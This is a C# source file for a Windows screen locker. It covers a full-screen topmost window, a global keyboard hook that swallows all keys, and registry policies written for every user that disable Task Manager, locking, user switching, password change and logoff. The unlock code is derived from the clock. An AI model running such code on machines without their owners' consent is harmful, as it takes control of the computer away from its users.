using Microsoft.Win32;
using System;
using System.IO.MemoryMappedFiles;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace llock.win
{
    public partial class Form1 : Form
    {
        Hook hook = new Hook();
        private string shareMkey;
        private int shareMLength;
        private int shareItemMLength = 255;
        private int shareIndex;

        protected override CreateParams CreateParams
        {
            get
            {
                const int WS_EX_APPWINDOW = 0x40000;
                const int WS_EX_TOOLWINDOW = 0x80;
                CreateParams cp = base.CreateParams;
                cp.ExStyle &= (~WS_EX_APPWINDOW);
                cp.ExStyle |= WS_EX_TOOLWINDOW;
                return cp;
            }
        }

        public Form1(string shareMkey, int shareMLength, int shareIndex)
        {
            this.shareMkey = shareMkey;
            this.shareMLength = shareMLength;
            this.shareIndex = shareIndex;

            InitializeComponent();
            this.FormBorderStyle = FormBorderStyle.None;
            this.StartPosition = FormStartPosition.CenterScreen;

            AppDomain.CurrentDomain.ProcessExit += (s, e) => hook.Close();
            Application.ApplicationExit += (s, e) => hook.Close();

            btn1.Click += (s, e) => textBox1.Text += "1";
            btn2.Click += (s, e) => textBox1.Text += "2";
            btn3.Click += (s, e) => textBox1.Text += "3";
            btn4.Click += (s, e) => textBox1.Text += "4";
            btn5.Click += (s, e) => textBox1.Text += "5";
            btn6.Click += (s, e) => textBox1.Text += "6";
            btn7.Click += (s, e) => textBox1.Text += "7";
            btn8.Click += (s, e) => textBox1.Text += "8";
            btn9.Click += (s, e) => textBox1.Text += "9";
            btn0.Click += (s, e) => textBox1.Text += "0";
            btnClear.Click += (s, e) => textBox1.Text = "";

        }

        [DllImport("user32.dll", EntryPoint = "SetWindowPos")]
        public static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);
        public const uint SWP_NOMOVE = 0x2;
        public const uint SWP_NOSIZE = 0x1;
        public static readonly IntPtr HWND_TOPMOST = new IntPtr(-1);
        public static readonly IntPtr HWND_NOTOPMOST = new IntPtr(-2);

        [DllImport("user32.dll", EntryPoint = "BlockInput")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool BlockInput([MarshalAs(UnmanagedType.Bool)] bool fBlockIt);

        private void OnLoad(object sender, EventArgs e)
        {
            hook.Start();
#if RELEASE
            this.WindowState = FormWindowState.Maximized;
#endif
            //将窗口置顶
            SetWindowPos(this.Handle, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);

            groupBox1.Location = new System.Drawing.Point((this.Width - groupBox1.Width) / 2, (this.Height - groupBox1.Height) / 2);

            mmf2 = MemoryMappedFile.CreateOrOpen($"{this.shareMkey}", this.shareMLength);
            accessor2 = mmf2.CreateViewAccessor();
            WriteLLock();
            new Thread(() =>
            {
                while (true)
                {
                    if (ReadCloseMemory())
                    {
                        hook.Close();
                        Environment.Exit(0);
                    }
                    WriteLLock();
                    Thread.Sleep(30);
                }
            }).Start();
        }
        MemoryMappedFile mmf2;
        MemoryMappedViewAccessor accessor2;
        DateTime startTime = new DateTime(1970, 1, 1);
        byte[] keyBytes = Encoding.UTF8.GetBytes("LLock");

        long lastTime = 0;
        private void WriteLLock()
        {
            long time = (long)(DateTime.UtcNow.Subtract(startTime)).TotalMilliseconds;
            if (time - lastTime >= 300)
            {
                WriteMemory(this.shareIndex, keyBytes, Encoding.UTF8.GetBytes(time.ToString()));
                lastTime = time;
            }
        }
        private void WriteMemory(int index, byte[] key, byte[] value)
        {
            int keyIndex = index * shareItemMLength;
            accessor2.Write(keyIndex, (byte)key.Length);
            keyIndex++;
            accessor2.WriteArray(keyIndex, key, 0, key.Length);
            keyIndex += key.Length;

            accessor2.Write(keyIndex, (byte)value.Length);
            keyIndex++;
            accessor2.WriteArray(keyIndex, value, 0, value.Length);
            keyIndex += value.Length;

            UpdatedState(index);
        }
        private void UpdatedState(int updatedOffset)
        {
            accessor2.Write((shareMLength - 1) * shareItemMLength, (byte)1);
        }
        private bool ReadCloseMemory()
        {
            int keyIndex = this.shareIndex * shareItemMLength;
            int keyLength = accessor2.ReadByte(keyIndex);
            keyIndex += 1 + keyLength;
            int valueLength = accessor2.ReadByte(keyIndex);
            keyIndex += 1;

            byte[] valueBytes = new byte[valueLength];
            if (valueBytes.Length > 0)
            {
                accessor2.ReadArray(keyIndex, valueBytes, 0, valueLength);
                string value = Encoding.UTF8.GetString(valueBytes, 0, valueLength);
                if (value == "close")
                {
                    return true;
                }
            }
            return false;
        }

        private void OnClose(object sender, FormClosingEventArgs e)
        {
            hook.Close();
            Environment.Exit(0);
        }

        bool loading = false;
        private void button1_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrWhiteSpace(textBox1.Text)) return;

            if (loading) return;
            loading = true;
            button1.Text = "ing.";

            try
            {
                DateTime dt = DateTime.Now;
                string psd = $"{dt.Hour / 10 % 10}{dt.Minute / 10 % 10}{dt.Hour % 10}{dt.Minute % 10}{dt.Month}{dt.Day}";
                if (psd == textBox1.Text)
                {
                    hook.Close();
                    this.Close();
                    Environment.Exit(0);
                }
            }
            catch (Exception)
            {

            }
            loading = false;
            button1.Text = "解锁";
        }
        

    }


    public class Hook : IDisposable
    {
        public delegate int HookProc(int nCode, int wParam, IntPtr lParam);
        static int hHook = 0;
        public const int WH_KEYBOARD_LL = 13;
        HookProc KeyBoardHookProcedure;
        [StructLayout(LayoutKind.Sequential)]
        public class KeyBoardHookStruct
        {
            public int vkCode;
            public int scanCode;
            public int flags;
            public int time;
            public int dwExtraInfo;
        }
        [DllImport("user32.dll")]
        public static extern int SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hInstance, int threadId);
        [DllImport("user32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
        public static extern bool UnhookWindowsHookEx(int idHook);
        [DllImport("user32.dll")]
        public static extern int CallNextHookEx(int idHook, int nCode, int wParam, IntPtr lParam);
        [DllImport("kernel32.dll")]
        public static extern IntPtr GetModuleHandle(string name);
        public void Start()
        {
            // 安装键盘钩子 
            if (hHook == 0)
            {
                KeyBoardHookProcedure = new HookProc(KeyBoardHookProc);
                hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyBoardHookProcedure, GetModuleHandle(null), 0);
                //如果设置钩子失败. 
                if (hHook == 0)
                    Close();
                else
                {
                    try
                    {
                        foreach (string user in Registry.Users.GetSubKeyNames())
                        {
                            RegistryKey key = Registry.Users.OpenSubKey(user, true).OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System", true);
                            if (key == null)
                                key = Registry.Users.OpenSubKey(user, true).CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");

                            RegistryKey key1 = Registry.LocalMachine.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System", true);
                            if (key1 == null)
                                key1 = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");

                            //任务管理器
                            key.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
                            key1.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
                            //锁定
                            key.SetValue("DisableLockWorkstation", 1, RegistryValueKind.DWord);
                            key1.SetValue("DisableLockWorkstation", 1, RegistryValueKind.DWord);
                            //切换用户
                            key.SetValue("HideFastUserSwitching", 1, RegistryValueKind.DWord);
                            key1.SetValue("HideFastUserSwitching", 1, RegistryValueKind.DWord);
                            //修改密码
                            key.SetValue("DisableChangePassword", 1, RegistryValueKind.DWord);
                            key1.SetValue("DisableChangePassword", 1, RegistryValueKind.DWord);
                            //关机
                            key.SetValue("ShutdownWithoutLogon", 0, RegistryValueKind.DWord);
                            key1.SetValue("ShutdownWithoutLogon", 0, RegistryValueKind.DWord);
                            //注销
                            key.SetValue("StartMenuLogOff", 1, RegistryValueKind.DWord);
                            key1.SetValue("StartMenuLogOff", 1, RegistryValueKind.DWord);



                            key.Close();
                            key1.Close();

                            //注销
                            RegistryKey zxKey = Registry.Users.OpenSubKey(user, true).OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", true);
                            if (zxKey == null)
                                zxKey = Registry.Users.OpenSubKey(user, true).CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
                            zxKey.SetValue("NoLogOff", 1, RegistryValueKind.DWord);
                            zxKey.SetValue("NoClose", 1, RegistryValueKind.DWord);
                            zxKey.SetValue("StartMenuLogOff", 1, RegistryValueKind.DWord);
                            zxKey.Close();
                        }
                    }
                    catch (Exception)
                    {
                    }
                    /*
                    Guid activePolicyGuid;
                    IntPtr ptr;
                    if (PowerGetActiveScheme(IntPtr.Zero, out ptr) == 0)
                    {
                        activePolicyGuid = (Guid)Marshal.PtrToStructure(ptr, typeof(Guid));
                        if (ptr != IntPtr.Zero)
                        {
                            Marshal.FreeHGlobal(ptr);
                        }
                        uint resultPowerButton = PowerWriteACValueIndex(IntPtr.Zero, ref activePolicyGuid, ref powerButtonGuid, ref powerButtonGuid, 0);
                        uint resultSleepButton = PowerWriteACValueIndex(IntPtr.Zero, ref activePolicyGuid, ref sleepButtonGuid, ref sleepButtonGuid, 0);
                    }
                    */
                    Task.Run(() =>
                    {
                        CommandHelper.Windows(string.Empty, new string[] { "gpupdate /force" });
                    });
                }
            }
        }
        public void Close()
        {
            bool retKeyboard = true;
            if (hHook != 0)
            {
                retKeyboard = UnhookWindowsHookEx(hHook);
                hHook = 0;
            }
            //如果去掉钩子失败. 
            //if (!retKeyboard) throw new Exception("UnhookWindowsHookEx failed.");
            try
            {
                foreach (string user in Registry.Users.GetSubKeyNames())
                {
                    RegistryKey key = Registry.Users.OpenSubKey(user, true).OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System", true);
                    RegistryKey key1 = Registry.LocalMachine.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System", true);
                    if (key != null)
                    {
                        key.DeleteValue("DisableTaskMgr", false);
                        key1.DeleteValue("DisableTaskMgr", false);
                        key.DeleteValue("DisableLockWorkstation", false);
                        key1.DeleteValue("DisableLockWorkstation", false);
                        key.DeleteValue("HideFastUserSwitching", false);
                        key1.DeleteValue("HideFastUserSwitching", false);
                        key.DeleteValue("DisableChangePassword", false);
                        key1.DeleteValue("DisableChangePassword", false);
                        key.DeleteValue("ShutdownWithoutLogon", false);
                        key1.DeleteValue("ShutdownWithoutLogon", false);
                        key.DeleteValue("StartMenuLogoff", false);
                        key1.DeleteValue("StartMenuLogoff", false);
                       

                        key.Close();
                        key1.Close();
                    }

                    RegistryKey zxKey = Registry.Users.OpenSubKey(user, true).OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", true);
                    if (zxKey != null)
                    {
                        zxKey.DeleteValue("NoLogOff", false);
                        zxKey.DeleteValue("NoClose", false);
                        zxKey.DeleteValue("StartMenuLogoff", false);
                        zxKey.Close();
                    }
                }
            }
            catch (Exception)
            {
            }
            CommandHelper.Windows(string.Empty, new string[] { "gpupdate /force" });
        }
        public static int KeyBoardHookProc(int nCode, int wParam, IntPtr lParam)
        {
            if (nCode >= 0)
            {
                return 1;
                /*
                KeyBoardHookStruct kbh = (KeyBoardHookStruct)Marshal.PtrToStructure(lParam, typeof(KeyBoardHookStruct));
                bool res = (kbh.vkCode >= (int)Keys.D0 && kbh.vkCode <= (int)Keys.D9)
                    || (kbh.vkCode >= (int)Keys.NumPad0 && kbh.vkCode <= (int)Keys.NumPad9)
                    || (kbh.vkCode >= (int)Keys.A && kbh.vkCode <= (int)Keys.Z);

                if (res == false)
                {
                    return 1;
                }
                */
            }
            return CallNextHookEx(hHook, nCode, wParam, lParam);
        }


        [DllImport("powrprof.dll")]
        public static extern uint GetActivePwrScheme(out IntPtr pActivePolicy);
        [DllImport("powrprof.dll", SetLastError = true)]
        public static extern UInt32 PowerGetActiveScheme(IntPtr UserRootPowerKey, out IntPtr ActivePolicyGuid);

        [DllImport("powrprof.dll")]
        public static extern uint PowerWriteACValueIndex(IntPtr RootPowerKey, ref Guid SchemeGuid, ref Guid SubGroupOfPowerSettingsGuid,
    ref Guid PowerSettingGuid, uint AcValueIndex);

        Guid powerButtonGuid = new Guid("4f971e89-eebd-4455-a8de-9e59040e7347"); // 电源按钮设置的GUID
        Guid sleepButtonGuid = new Guid("96996bc0-ad50-47ec-923b-6f418386bca1"); // 睡眠按钮设置的GUID




        #region IDisposable 成员
        public void Dispose()
        {
            Close();
        }

        public struct tagMSG
        {
            public int hwnd;
            public uint message;
            public int wParam;
            public long lParam;
            public uint time;
            public int pt;
        }
        [DllImport("user32.dll")]
        public static extern int GetMessage(ref tagMSG lpMsg, int a, int hwnd, int wMsgFilterMax);
        #endregion
    }
}
